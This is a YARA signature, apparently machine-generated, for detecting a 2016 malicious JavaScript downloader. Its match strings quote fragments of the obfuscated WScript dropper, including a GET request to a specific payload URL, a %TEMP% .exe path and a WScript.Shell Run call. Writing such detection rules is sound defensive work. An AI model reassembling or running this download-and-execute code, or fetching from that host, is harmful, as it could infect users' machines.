rule sig_20160328_5134cc06821273a1338b395c9389017e {
  meta:
    description = "datamaliciousorder - file 20160328_5134cc06821273a1338b395c9389017e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6f971c9d2d2a88e5c08a5133db6facc16dcc950cbb0e695df3797c71171d7431"

  strings:
    $s1  = "function Ildeng() {return Ybxxhjqdi[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"X09hTfjn.exe\";};" fullword ascii
    $s2  = "do {WScript[Pcbqysrw](Zjgmmk() * 11)} while (Xaawgdlg[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "var Ybxxhjqdi = function Ffhvk() {return WScript[Qpqdqbfuj](\"WScript.Shell\");}();" fullword ascii
    $s4  = "Xaawgdlg[Sfzgoa](\"GET\", \"http://myplaymobil.co.uk/k3iad\", false);" fullword ascii
    $s5  = "function Rcofiwgzc(Vdugwlkpyb, Eesjllbz){return Vdugwlkpyb - Eesjllbz;};" fullword ascii
    $s6  = "function Eeesrwcse() {return ((Gjqnuon == true) && (Gjqnuon == Fkpuq)) ? 1 : Bytqvxy;};" fullword ascii
    $s7  = "function Ebelbvbo(Pkdiu){Ybxxhjqdi[\"Run\"](Pkdiu, Bytqvxy, Bytqvxy);};" fullword ascii
    $s8  = "var Vuomh = new this[\"Date\"]();" fullword ascii
    $s9  = "function Zjgmmk(){return 22;};" fullword ascii
    $s10 = "var Gjqnuon = false;" fullword ascii
    $s11 = " while (Jngmi){" fullword ascii
    $s12 = "var Thsirpwvlc = false;" fullword ascii
    $s13 = "function Edjscogpql()" fullword ascii
    $s14 = "function Mwzhhby(){return Tvzpckn;};" fullword ascii
    $s15 = "function Xcpgyfmr(Pzftxn) {var Iigzp = (1, 2, 3, 4, 5, Pzftxn); return Iigzp;};" fullword ascii
    $s16 = "function Nmozknofg(){return Qpqdqbfuj;};" fullword ascii
    $s17 = "Gjqnuon = true; " fullword ascii
    $s18 = "return Rcofiwgzc(Xyegiiwu, Ktcgysmyau);" fullword ascii
    $s19 = "var Fkpuq = false;" fullword ascii
    $s20 = "Fkpuq = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}